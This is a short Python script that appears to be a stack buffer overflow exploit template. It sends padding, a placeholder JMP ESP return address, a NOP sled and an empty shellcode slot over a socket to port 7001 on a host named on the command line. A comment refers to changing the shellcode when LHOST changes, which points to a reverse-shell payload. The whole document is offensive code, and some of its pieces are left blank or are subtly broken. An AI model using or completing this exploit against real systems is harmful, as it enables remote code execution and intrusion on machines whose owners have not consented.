#!/usr/bin/python
import socket
import sys

try:
  print("\n [+] Sending buffer...")
  target = sys.argv[1]
  port = 7001
  size = 2560

  buffer = b"A"*2288
  buffer += b" " #JMP ESP
  buffer += b"C" * 8 # Buffer of C's before the ESP register
  buffer += b"\x90" * 10 # NOP Sled to pass through decoder stub 
  # Make sure to change the shellcode whenever LHOST changes 
  buffer += bytearray(" ") # insert shellcode here

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  s.send(buffer)
  s.close()
  
  print("\n [+] Done!")
  
except:
  print("\n [-] Error could not send buffer! ")
